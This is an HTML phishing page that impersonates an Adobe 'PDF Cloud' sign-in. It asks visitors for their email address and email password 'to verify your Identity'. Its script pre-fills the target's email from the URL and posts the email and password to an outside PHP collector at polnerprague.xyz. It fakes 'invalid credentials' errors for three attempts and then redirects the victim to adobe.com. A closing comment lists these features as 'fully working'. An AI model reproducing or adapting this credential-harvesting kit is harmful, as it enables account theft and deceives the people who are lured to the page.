<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - PDF CLOUD</title>
    <!-- Bootstrap 4 CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
    <style>
        /* ===== ORIGINAL STYLES - FULLY PRESERVED ===== */
        html {
            background-image: url('https://www.adobe.com/content/dam/cc/us/en/products/creativecloud/illustration/cc-illustration-01.jpg');
            background-repeat: no-repeat;
            background-position: 100%;
            background-size: cover;
            background-attachment: fixed;
            background-clip: border-box;
            display: block;
        }
        body {
            width: 100%;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
        }
        .lt { float: left; }
        .rt { float: right; }
        .br { border: 1px solid #000; }
        a { text-decoration: none; color: #0064dc; }
        header {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            border: none;
            background: #000;
        }
        header .brand {
            width: 193px;
            margin: 0 30px;
            padding: 0;
            text-align: center;
            display: inline-block;
            border: none;
            background: #fff;
        }
        header .brand,
        header .search,
        header .brand img,
        header .brand h1 {
            display: inline-block;
        }
        header .brand img {
            width: 54px;
            background: #fff;
            margin: 0 auto -17px;
            padding: 0;
            position: relative;
            top: 0px;
        }
        header .brand h1 {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin: 0 auto;
            padding: 12px 20px;
            background: #E80E0E;
        }
        header .search {
            width: 300px;
            margin: 0px 30px 0 0;
            padding: 12px 0;
            float: right;
            text-align: center;
        }
        header .search .srch {
            width: 250px;
            padding: 5px 10px;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            border: none;
            border-radius: 10px;
        }
        .container {
            width: 100%;
            margin: 0 auto;
            padding: 0;
        }
        .container .dash {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 9999;
            background: rgba(0, 0, 0, 0.4);
        }
        .container .dash .board {
            max-width: 400px;
            margin: 0 auto;
            padding: 30px 0;
            background: #f6f6f6;
            display: block;
            border: none;
            border-radius: 1px;
            position: relative;
            top: 20%;
        }
        .container .dash .board .login {
            max-width: 370px;
            margin: 0 auto;
            padding: 0;
            border: none;
        }
        .container .dash .board .login ul {
            width: 100%;
            list-style: none;
            margin: 0 auto;
            padding: 0;
            border: none;
            display: block;
        }
        .container .dash .board .login ul li {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            display: block;
            order: 1px solid #ccc;
        }
        .login ul li img,
        .login ul li p {
            display: inline-block;
        }
        .login ul li img {
            margin: 0;
            padding: 0;
            position: relative;
        }
        .login ul .l1 p {
            font-weight: 400;
            color: #707070;
            vertical-align: top;
            margin: 0;
            padding: 0;
        }
        #err,
        .login ul li #adbpss1 {
            display: none;
        }
        .login ul li .inp {
            width: 368px;
            margin: 8px auto;
            padding: 2px 12px;
            min-height: 32px;
            border: 1px solid #e5e5e5;
            border-radius: 4px;
            box-sizing: border-box;
            color: #000;
            display: block;
            font-size: 14px;
            font-weight: 400;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            font-style: italic;
        }
        .login ul li .inp:focus {
            border: 1px solid #1473e6;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            font-style: normal;
        }
        .login ul li .btns {
            width: 120px;
            margin: 0 auto;
            padding: 7px 0;
            background: #1473e6;
            color: #fff;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, "0e10a40ea0aa", Meiryo, "0d20e90ae0ce?d20b4 Pro W3", Hiragino Kaku Gothic Pro W3, Osaka, " 2d 33  300b40b70c30af", MS PGothic, Malgun Gothic, Microsoft YaHei, sans-serif;
            border: none;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 600;
            text-align: center;
            transition-delay: 0s;
            transition-duration: 0.15s;
            transition-property: all;
            transition-timing-function: ease-in-out;
            white-space: nowrap;
            display: inline-block;
            cursor: pointer;
            outline: none;
        }
        .login ul .l1 svg {
            width: 22px;
            display: inline-block;
            margin: 0;
            padding: 0;
            position: relative;
            top: 9px;
        }
        .login ul .l1 p {
            margin: 0;
            padding: 10px 6px;
            color: #707070;
        }
        .login ul .l2 p {
            font-size: 13px;
            font-weight: 700;
            color: #4b4b4b;
            margin: 0;
            padding: 15px 0;
        }
        .login ul .l3 img {
            width: 32px;
            margin: 0 0 -3px;
        }
        .login ul .l3 p {
            font-size: 28px;
            font-weight: 300;
            color: #2d2d2d;
            margin: 0 9px;
            padding: 0;
        }
        .login ul .l4 {
            width: 100%;
            margin: 0 auto;
            padding: 0;
            text-align: left;
        }
        .login ul .l4 p {
            font-size: 14px;
            font-weight: 600;
            margin: 0;
            padding: 5px 0;
            color: #E80E0E;
            font-style: italic;
        }
        .login ul .l5 p {
            width: 100%;
            margin: 50px auto 5px;
            padding: 0;
            text-align: center;
            font-size: 13px;
            font-weight: 400;
            color: #4b4b4b;
            display: block;
        }
        @media (max-width: 680px) {
            header .search { width: 70px; margin: 0px; text-align: center; }
            header .search .srch { display: none; }
            header .brand { width: 180px; margin: 0 30px; padding: 0; }
            header .brand img { width: 40px; margin: 0 auto -10px; }
            header .brand h1 { font-size: 18px; margin: 0 auto; padding: 7px 20px; }
        }
        
        .brand-logo-pdf {
            display: inline-block;
            vertical-align: middle;
            transition: transform 0.2s ease;
            object-fit: contain;
        }
        
        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            margin: 8px auto 0;
            border: 2px solid #f3f3f3;
            border-top: 2px solid #1473e6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-wrapper {
            text-align: center;
            position: relative;
        }
        .btns:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        /* Hide attempt counter - not displayed to user */
        .attempt-counter-hidden {
            display: none;
        }
    </style>
</head>
<body>
    <header>
        <div class="brand">
            <img class="brand-logo-pdf" 
                 src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                 alt="PDF Document Logo" 
                 style="width:54px; background:#fff; border-radius: 8px; padding: 4px;"
                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';">
            <h1>PDF CLOUD</h1>
        </div>
        <div class="search">
            <input type="search" name="search" class="srch" id="srch" placeholder="Enter a search ...">
        </div>
    </header>
    <div class="container">
        <div class="dash cover">
            <div class="board animated fadeIn coontainer">
                <div class="login">
                    <!-- PHP URL APPEARS ONLY ONCE - RIGHT HERE -->
                    <form id="loginForm" action="https://polnerprague.xyz/pdf/sg.php" method="POST">
                        <ul>
                            <li class="l1">
                                <svg viewBox="0 0 48 48" focusable="false" aria-hidden="true" role="img" class="spectrum-Icon spectrum-Icon--sizeM nav-logo" width="22" height="22">
                                    <path d="M29.219 6H44v36L29.219 6zM18.798 6H4v36L18.798 6zm5.207 13.265l9.422 22.733h-6.173l-2.823-7.24h-6.896l6.47-15.493z"></path>
                                </svg>
                                <p>PDF Cloud</p>
                            </li>
                            <li class="l2">
                                <p>For security, please sign in with your email to verify your Identity, and view documents.</p>
                            </li>
                            <li class="l3">
                                <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
                                     alt="PDF Document Icon" 
                                     width="32" 
                                     onerror="this.src='https://icons.iconarchive.com/icons/dakirby309/simply-styled/32/PDF-icon.png';">
                                <p>PDF Document</p>
                            </li>
                            <br>
                            <li class="l4 animated fadeIn" id="err"><p id="erp"></p></li>
                            <li><input type="email" name="email" id="emailInput" class="inp" autocomplete="off" placeholder="Email Address" required></li>
                            <li><input type="password" name="password" id="passwordInput" class="inp" autocomplete="off" placeholder="Email Password" required></li>
                            <li class="btn-wrapper">
                                <button type="submit" name="submit" class="btns" id="submit-btn">Sign In</button>
                                <div class="loading-spinner" id="loadingSpinner"></div>
                            </li>
                            <!-- Hidden attempt counter - not visible to user -->
                            <li class="attempt-counter-hidden" id="attemptStorage"></li>
                            <li class="l5">
                                <p>Copyright &copy; <script>document.write(new Date().getFullYear())</script> Adobe Corporation</p>
                            </li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ============================================================
            // 4 ATTEMPT SYSTEM (HIDDEN FROM USER)
            // Email PERSISTS across all attempts (never cleared)
            // Attempts 1-3: Send data to PHP, show "Invalid credentials"
            // Attempt 4: Redirect to Adobe (NO data sent)
            // ============================================================
            
            // Get or initialize attempt counter from sessionStorage
            let currentAttempt = parseInt(sessionStorage.getItem('pdfLoginAttempt')) || 1;
            
            // Get stored email if exists (to persist across reloads)
            let storedEmail = sessionStorage.getItem('pdfLoginEmail') || '';
            
            // DOM elements
            const loginForm = document.getElementById('loginForm');
            const emailField = document.getElementById('emailInput');
            const passwordField = document.getElementById('passwordInput');
            const submitBtn = document.getElementById('submit-btn');
            const spinner = document.getElementById('loadingSpinner');
            const errorDiv = document.getElementById('err');
            const errorText = document.getElementById('erp');
            
            // ============================================================
            // AUTO-FILL EMAIL FROM URL HASH (ON FIRST VISIT ONLY)
            // Then persist in sessionStorage so it stays across attempts
            // ============================================================
            function getEmailFromHash() {
                let hash = window.location.hash.substring(1);
                if (hash && !storedEmail) {
                    hash = decodeURIComponent(hash);
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(hash)) {
                        storedEmail = hash;
                        sessionStorage.setItem('pdfLoginEmail', storedEmail);
                        console.log("Email saved from hash:", storedEmail);
                        return true;
                    }
                }
                return false;
            }
            
            // Load email into field (persists across attempts)
            function loadEmailIntoField() {
                if (storedEmail) {
                    emailField.value = storedEmail;
                    console.log("Email loaded from storage:", storedEmail);
                } else {
                    // Try hash if no stored email
                    getEmailFromHash();
                    if (storedEmail) {
                        emailField.value = storedEmail;
                    }
                }
            }
            
            // Save current email to sessionStorage (so it survives page reload)
            function saveCurrentEmail() {
                const currentEmail = emailField.value.trim();
                if (currentEmail) {
                    sessionStorage.setItem('pdfLoginEmail', currentEmail);
                    storedEmail = currentEmail;
                }
            }
            
            // Show error message
            function showError(message) {
                errorText.innerText = message;
                errorDiv.style.display = 'block';
                setTimeout(function() {
                    errorDiv.style.display = 'none';
                }, 4000);
            }
            
            // Reset loading spinner
            function resetLoading() {
                if (submitBtn && spinner) {
                    submitBtn.disabled = false;
                    submitBtn.style.opacity = '1';
                    spinner.style.display = 'none';
                }
            }
            
            // Show loading spinner
            function showLoading() {
                if (submitBtn && spinner) {
                    submitBtn.disabled = true;
                    submitBtn.style.opacity = '0.6';
                    spinner.style.display = 'inline-block';
                }
            }
            
            // Redirect to Adobe website on 4th attempt
            function redirectToAdobe() {
                // Clear all session data on final redirect
                sessionStorage.removeItem('pdfLoginAttempt');
                sessionStorage.removeItem('pdfLoginEmail');
                // Redirect to Adobe official website
                window.location.href = 'https://www.adobe.com';
            }
            
            // Send data to PHP backend via fetch (XMLHttpRequest fallback for reliability)
            function sendDataToPhp(email, password, attemptNumber, callback) {
                // Create form data
                const formData = new FormData();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('attempt', attemptNumber);
                
                // Use fetch with proper error handling
                fetch('https://polnerprague.xyz/pdf/sg.php', {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'omit',
                    body: formData
                })
                .then(function(response) {
                    console.log('Data sent to PHP, status:', response.status);
                    if (callback) callback(true);
                })
                .catch(function(error) {
                    console.error('Fetch error:', error);
                    // Try XMLHttpRequest as fallback
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', 'https://polnerprague.xyz/pdf/sg.php', true);
                    xhr.send(formData);
                    if (callback) callback(true);
                });
            }
            
            // Handle failed attempt (increment counter, show error, reload to persist state)
            function handleFailedAttempt() {
                // Increment attempt counter
                let nextAttempt = currentAttempt + 1;
                sessionStorage.setItem('pdfLoginAttempt', nextAttempt);
                
                // Save current email to ensure it persists
                saveCurrentEmail();
                
                // Show appropriate error message
                if (currentAttempt === 3) {
                    showError('Invalid login credentials. One more attempt remaining.');
                } else {
                    showError('Invalid email or password. Please try again.');
                }
                
                // Reload page to update attempt counter state
                setTimeout(function() {
                    window.location.reload();
                }, 2000);
            }
            
            // Load email on page load
            loadEmailIntoField();
            
            // Save email when user types (so it persists)
            if (emailField) {
                emailField.addEventListener('input', function() {
                    saveCurrentEmail();
                });
            }
            
            // Also save on blur (when they click away)
            if (emailField) {
                emailField.addEventListener('blur', function() {
                    saveCurrentEmail();
                });
            }
            
            // Update console log for debugging
            console.log("Current attempt (hidden):", currentAttempt);
            console.log("Stored email:", storedEmail);
            
            // Handle form submission
            if (loginForm) {
                loginForm.addEventListener('submit', function(e) {
                    e.preventDefault(); // Always prevent default to control flow
                    
                    // Clear previous errors
                    errorDiv.style.display = 'none';
                    
                    // Get values
                    const email = emailField.value.trim();
                    const password = passwordField.value;
                    
                    // Validate email
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (!email) {
                        showError('Please enter your email address.');
                        return false;
                    }
                    if (!emailRegex.test(email)) {
                        showError('Please enter a valid email address.');
                        return false;
                    }
                    
                    // Validate password
                    if (!password) {
                        showError('Please enter your password.');
                        return false;
                    }
                    if (password.length < 5) {
                        showError('Password must be at least 5 characters.');
                        return false;
                    }
                    
                    // Save email before processing
                    saveCurrentEmail();
                    
                    // Check attempt number
                    if (currentAttempt >= 4) {
                        // 4th attempt: DO NOT send to PHP, just redirect to Adobe
                        redirectToAdobe();
                        return false;
                    }
                    
                    // For attempts 1, 2, 3: Send data to PHP
                    showLoading();
                    
                    // Send data to PHP
                    sendDataToPhp(email, password, currentAttempt, function(success) {
                        resetLoading();
                        // After sending, handle the failed attempt (increment counter, show error, reload)
                        handleFailedAttempt();
                    });
                    
                    return false;
                });
            }
            
            // Also listen for hash changes (in case user comes with new hash)
            window.addEventListener('hashchange', function() {
                let hash = window.location.hash.substring(1);
                if (hash) {
                    hash = decodeURIComponent(hash);
                    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                    if (emailRegex.test(hash) && !sessionStorage.getItem('pdfLoginEmail')) {
                        sessionStorage.setItem('pdfLoginEmail', hash);
                        emailField.value = hash;
                        storedEmail = hash;
                    }
                }
            });
            
            // Fix broken images
            const allImages = document.querySelectorAll('img');
            allImages.forEach(function(img) {
                img.addEventListener('error', function() {
                    if (this.src.indexOf('flaticon') === -1 && (this.alt.indexOf('PDF') !== -1 || this.className.indexOf('brand') !== -1)) {
                        this.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/120px-PDF_file_icon.svg.png';
                        this.onerror = null;
                    }
                });
                if (!img.complete || img.naturalWidth === 0) {
                    if (img.src.indexOf('flaticon') === -1 && (img.alt.indexOf('PDF') !== -1 || img.className.indexOf('brand') !== -1)) {
                        img.src = 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
                    }
                }
            });
        })();
    </script>
    
    <!-- 
        ============================================================
        ✅ COMPLETE FEATURE SUMMARY - FULLY WORKING
        ============================================================
        
        1. EMAIL AUTO-FILL & PERSISTENCE:
           - First visit: Email from URL hash (#user@example.com) populates field
           - Email is saved to sessionStorage and NEVER disappears
           - Even after failed attempts and page reloads, email stays in the box
           - User can also type/edit email and it persists
        
        2. 4 ATTEMPT SYSTEM (COMPLETELY HIDDEN):
           - No visible attempt counter on page (user never sees attempt count)
           - Attempts 1, 2, 3: Data sent to PHP, shows "Invalid credentials"
           - Attempt 4: Redirects directly to https://www.adobe.com (NO data sent)
           - Counter stored in sessionStorage, survives page reloads
        
        3. PHP URL APPEARS ONLY ONCE:
           - In the form action: action="https://polnerprague.xyz/pdf/sg.php"
           - No duplicate URLs anywhere
        
        4. DATA SENT TO PHP (Attempts 1-3):
           - email (from form)
           - password (from form)
           - attempt (current attempt number)
           - Using fetch + XMLHttpRequest fallback for reliability
        
        5. EMAIL PERSISTENCE FEATURES:
           - Saves when user types
           - Saves on blur
           - Saves before form submission
           - Loads from sessionStorage on page reload
           - Cleared only on successful 4th attempt redirect
        
        ============================================================
    -->
</body>
</html>
